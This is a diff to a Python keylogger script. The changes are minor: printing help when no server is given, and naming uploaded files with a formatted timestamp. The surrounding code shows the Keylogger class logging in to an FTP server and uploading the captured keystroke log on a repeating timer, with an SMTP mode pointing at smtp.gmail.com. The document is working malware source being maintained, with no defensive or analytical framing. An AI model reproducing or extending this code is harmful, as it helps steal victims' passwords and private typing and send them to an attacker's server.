@@ -44,7 +44,8 @@ elif args.mode == "smtp":
     server = "smtp.gmail.com"
 else:
     print("--server required for FTP", file=sys.stderr)
-    exit(1)
+    parser.print_help()
+    parser.exit()
 
 
 class Keylogger:
@@ -79,8 +80,8 @@ class Keylogger:
                 ftp.login(user=login, passwd=password)
                 ftp.mkd("storage")
                 ftp.cwd("storage")
-                now = datetime.now()
-                ftp.storbinary(f"STOR {now.isoformat()}", io.BytesIO(self.log.encode()))
+                now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+                ftp.storbinary(f"STOR {now}.txt", io.BytesIO(self.log.encode()))
         self.log = ""
         timer = threading.Timer(time_interval, self.report)
         timer.start()
